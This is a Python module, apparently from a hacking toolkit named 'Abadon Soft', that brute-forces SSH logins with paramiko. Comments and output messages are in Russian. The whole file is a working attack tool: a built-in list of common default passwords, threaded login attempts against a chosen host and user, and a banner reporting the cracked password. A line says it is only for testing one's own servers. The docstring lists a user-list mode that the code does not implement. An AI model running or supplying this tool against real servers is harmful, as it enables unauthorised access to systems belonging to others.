"""
Abadon Soft — SSH брутфорс (аналог hydra для SSH).
Использует paramiko. Только для тестирования СВОИХ серверов.

Команды:
    sshbrute <host> <user> [wordlist]      — брутфорс одного юзера
    sshbrute <host> <user> <pass>          — проверить один пароль
    sshbrute <host> userlist.txt wordlist  — список юзеров
    sshbrute help                          — справка
"""

import os
import sys
import time
import threading

NAME    = "sshbrute"
TITLE   = "SSH Brute Force"
DESC    = "Подбор пароля SSH (paramiko, только свои серверы)"
USAGE   = "sshbrute <host[:port]> <user> [wordlist]"
ALIASES = ["ssh", "sshb"]

DEFAULT_PORT    = 22
CONNECT_TIMEOUT = 5.0
RETRY_SLEEP     = 0.3
MAX_THREADS     = 4          # SSH серверы банят при параллельных попытках

# ─── Встроенные пароли ───────────────────────────────────────────
BUILTIN_PASSWORDS = [
    "password", "123456", "admin", "root", "toor", "test",
    "qwerty", "letmein", "welcome", "password1", "pass",
    "changeme", "1234", "12345", "123456789", "1qaz2wsx",
    "admin123", "admin1234", "administrator", "root123",
    "secret", "raspberry", "ubuntu", "debian", "centos",
    "docker", "vagrant", "alpine", "postgres", "mysql",
    "oracle", "tomcat", "jenkins", "git", "gitlab",
    "", "pass123", "p@ssw0rd", "Pa$$w0rd", "Summer2023",
    "Winter2023", "Spring2023", "Autumn2023", "Password1",
]


# ─── Утилиты ─────────────────────────────────────────────────────

def _require_paramiko():
    try:
        import paramiko
        return paramiko
    except ImportError:
        return None


def _find_wordlist(name="wifi_password.txt") -> str:
    here = os.path.dirname(os.path.abspath(__file__))
    root = os.path.dirname(here)
    for p in (
        os.path.join(here, name),
        os.path.join(root, name),
        os.path.join(here, "wifi_password.txt"),
        os.path.join(root, "wifi_password.txt"),
    ):
        if os.path.isfile(p):
            return p
    return ""


def _load_lines(path: str) -> list:
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return []


def _try_ssh(paramiko, host: str, port: int, user: str, password: str,
             timeout: float) -> tuple:
    """
    Возвращает (ok: bool, err_msg: str).
    ok=True если подключение успешно.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=host,
            port=port,
            username=user,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False,
            banner_timeout=timeout,
        )
        client.close()
        return True, ""
    except paramiko.AuthenticationException:
        return False, "auth"
    except paramiko.SSHException as e:
        return False, f"ssh:{e}"
    except OSError as e:
        return False, f"net:{e}"
    except Exception as e:
        return False, str(e)
    finally:
        try:
            client.close()
        except Exception:
            pass


# ─── Основная атака ──────────────────────────────────────────────

def _attack(emit, host: str, port: int, user: str, passwords: list,
            should_stop, paramiko):
    total = len(passwords)
    t0    = time.time()

    emit(f"[#a06cd5]◆ хост:[/]    [b]{host}:{port}[/]")
    emit(f"[#a06cd5]◆ юзер:[/]    [b]{user}[/]")
    emit(f"[#a06cd5]◆ паролей:[/] [b]{total}[/]")
    emit(f"[#a06cd5]◆ потоков:[/] [b]{MAX_THREADS}[/]")
    emit("[#e94b4b][b]◆ запускаю перебор… (stop — остановить)[/b][/]")
    emit("")

    found       = [None]
    idx         = [0]
    lock        = threading.Lock()
    pw_queue    = list(passwords)  # FIFO

    def worker():
        while True:
            with lock:
                if found[0] is not None or should_stop():
                    break
                if not pw_queue:
                    break
                pwd = pw_queue.pop(0)
                i   = idx[0]
                idx[0] += 1

            ok, err = _try_ssh(paramiko, host, port, user, pwd, CONNECT_TIMEOUT)

            if ok:
                with lock:
                    found[0] = pwd
                return

            with lock:
                elapsed = time.time() - t0
                emit(f"[dim][{i+1:>4}/{total}][/dim]  "
                     f"[#b794f4]{pwd:<30}[/]  "
                     f"[#c93a3a]FAIL[/]  [dim]{err}[/dim]")

            time.sleep(RETRY_SLEEP)

    threads = []
    for _ in range(min(MAX_THREADS, total)):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    elapsed = time.time() - t0

    if found[0] is not None:
        pwd = found[0]
        emit("")
        emit("[#e94b4b][b]╔══════════════════════════════════════════╗[/b][/]")
        emit("[#e94b4b][b]║         В З Л О М   У С П Е Ш Е Н        ║[/b][/]")
        emit("[#e94b4b][b]╚══════════════════════════════════════════╝[/b][/]")
        emit(f"  [#a06cd5]◆ хост:[/]    [b]{host}:{port}[/]")
        emit(f"  [#a06cd5]◆ юзер:[/]    [b]{user}[/]")
        emit(f"  [#a06cd5]◆ пароль:[/]  [#e94b4b][b]{pwd}[/b][/]")
        emit(f"  [#a06cd5]◆ время:[/]   [b]{elapsed:.1f}с[/]")
        emit("")
        emit(f"[#5a2a82]  → подключиться: ssh {user}@{host}[/]")
        return True

    if should_stop():
        emit(f"\n[#c93a3a]◆ остановлено после {idx[0]} попыток[/]")
    else:
        emit(f"\n[#c93a3a]◆ словарь исчерпан — пароль не найден[/]")
        emit(f"[#5a2a82]  → попробуй другой словарь (например rockyou.txt)[/]")
    return False


# ─── Точка входа ─────────────────────────────────────────────────

def run(args: str, emit, invoked_as: str = None, should_stop=None):
    if should_stop is None:
        should_stop = lambda: False

    args = (args or "").strip()

    if not args or args in ("help", "?", "h"):
        emit("[#c93a3a][b]◆ SSH BRUTE FORCE[/b][/]")
        emit("")
        emit("  [b]sshbrute <host> <user>[/b]              — перебор словарём")
        emit("  [b]sshbrute <host> <user> <словарь>[/b]   — свой словарь")
        emit("  [b]sshbrute 192.168.1.1:2222 root[/b]     — нестандартный порт")
        emit("")
        emit("[#5a2a82]  ⚠  только для тестирования СВОИХ серверов[/]")
        emit("[#5a2a82]  пример: sshbrute 192.168.1.100 root[/]")
        return

    paramiko = _require_paramiko()
    if paramiko is None:
        emit("[#c93a3a]◆ paramiko не установлен[/]")
        emit("[#5a2a82]  → должен установиться автоматически при запуске[/]")
        return

    parts = args.split()
    if len(parts) < 2:
        emit("[#c93a3a]◆ укажи хост и юзера: sshbrute <host> <user>[/]")
        return

    # Парсим хост:порт
    host_part = parts[0]
    if ":" in host_part:
        host, port_s = host_part.rsplit(":", 1)
        try:
            port = int(port_s)
        except Exception:
            port = DEFAULT_PORT
    else:
        host = host_part
        port = DEFAULT_PORT

    user = parts[1]

    # Определяем словарь/пароль
    wordlist_path = ""
    single_pass   = ""

    if len(parts) >= 3:
        third = parts[2]
        if os.path.isfile(third):
            wordlist_path = third
        elif len(third) < 60 and not os.sep in third:
            # Выглядит как пароль
            single_pass = third

    emit("")

    if single_pass:
        # Проверяем один пароль
        emit(f"[#a06cd5]◆ проверяю:[/] {host}:{port}  user=[b]{user}[/]  pass=[b]{single_pass}[/]")
        ok, err = _try_ssh(paramiko, host, port, user, single_pass, CONNECT_TIMEOUT)
        if ok:
            emit(f"[#e94b4b][b]✓ ПОДКЛЮЧИЛСЯ![/b][/]  {user}@{host}:{port}  :  {single_pass}")
        else:
            emit(f"[#c93a3a]✗ Не подошло[/]  ({err})")
        return

    # Словарь
    if not wordlist_path:
        wordlist_path = _find_wordlist()
    passwords = _load_lines(wordlist_path) if wordlist_path else BUILTIN_PASSWORDS[:]

    if wordlist_path and not _load_lines(wordlist_path):
        emit(f"[#c93a3a]◆ не могу прочитать: {wordlist_path}[/]")
        return

    # Дедупликация
    passwords = list(dict.fromkeys(passwords))

    _attack(emit, host, port, user, passwords, should_stop, paramiko)
